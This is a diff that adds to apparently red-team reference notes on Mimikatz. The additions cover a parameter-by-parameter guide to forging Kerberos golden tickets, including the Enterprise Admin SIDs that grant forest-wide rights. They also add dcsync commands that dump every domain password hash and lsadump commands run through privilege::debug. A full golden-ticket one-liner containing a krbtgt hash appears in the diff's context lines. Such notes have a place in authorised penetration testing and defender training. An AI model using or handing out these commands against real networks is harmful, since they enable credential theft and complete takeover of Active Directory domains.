@@ -319,7 +319,7 @@ lsadump::sam dumps the local Security Account Manager (SAM) NT hashes (cf. SAM s
 
 
 example 2:
-
+```
 lsadump::lsa
 ```
 This is used to dump all local credentials on a Windows computer. LSADUMP::Trust – Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly).
@@ -330,6 +330,55 @@ golden ticket example:
 .\mimikatz.exe "kerberos::golden /User:Administrator /domain:rd.lab.adsecurity.org /id:512 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
 ```
 
+Mimikatz Golden Ticket Command Reference:
+
+The Mimikatz command to create a golden ticket is “kerberos::golden”
+
+* /domain – the fully qualified domain name. In this example: “lab.adsecurity.org”.
+* /sid – the SID of the domain. In this example: “S-1-5-21-1473643419-774954089-2222329127”.
+* /sids – Additional SIDs for accounts/groups in the AD forest with rights you want the ticket to spoof. Typically, this will be the Enterprise Admins group for the root domain “S-1-5-21-1473643419-774954089-5872329127-519”. 
+* /user – username to impersonate
+* /groups (optional) – group RIDs the user is a member of (the first is the primary group).
+Add user or computer account RIDs to receive the same access.
+Default Groups: 513,512,520,518,519 for the well-known Administrator’s groups (listed below).
+* /krbtgt – NTLM password hash for the domain KDC service account (KRBTGT). Used to encrypt and sign the TGT.
+* /ticket (optional) – provide a path and name for saving the Golden Ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.
+* /ptt – as an alternate to /ticket – use this to immediately inject the forged ticket into memory for use.
+* /id (optional) – user RID. Mimikatz default is 500 (the default Administrator account RID).
+* /startoffset (optional) – the start offset when the ticket is available (generally set to –10 or 0 if this option is used). Mimikatz Default value is 0.
+* /endin (optional) – ticket lifetime. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 10 hours (600 minutes).
+* /renewmax (optional) – maximum ticket lifetime with renewal. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 7 days (10,080 minutes).
+* /sids (optional) – set to be the SID of the Enterprise Admins group in the AD forest ([ADRootDomainSID]-519) to spoof Enterprise Admin rights throughout the AD forest (AD admin in every domain in the AD Forest).
+* /aes128 – the AES128 key
+* /aes256 – the AES256 key
+
+Golden Ticket Default Groups:
+
+* Domain Users SID: S-1-5-21<DOMAINID>-513
+* Domain Admins SID: S-1-5-21<DOMAINID>-512
+* Schema Admins SID: S-1-5-21<DOMAINID>-518
+* Enterprise Admins SID: S-1-5-21<DOMAINID>-519 (this is only effective when the forged ticket is created in the Forest root domain, though add using /sids parameter for AD forest admin rights)
+* Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520
+  
+example 3: 
+  
+Mimikatz has a feature (dcsync) which utilises the Directory Replication Service (DRS) to retrieve the password hashes from the NTDS.DIT file. This technique eliminates the need to authenticate directly with the domain controller as it can be executed from any system that is part of the domain from the context of domain administrator. Therefore it is the standard technique for red teams as it is less noisy.
+```
+lsadump::dcsync /domain:pentestlab.local /all /csv
+```
+  
+By specifying the domain username with the /user parameter Mimikatz can dump all the account information of this particular user including his password hash.
+```
+lsadump::dcsync /domain:pentestlab.local /user:test
+```
+  
+Alternatively executing Mimikatz directly in the domain controller password hashes can be dumped via the lsass.exe process.
+```
+privilege::debug
+```
+```
+lsadump::lsa /inject
+```
 
 ### kekeo
 similar to mimikatz
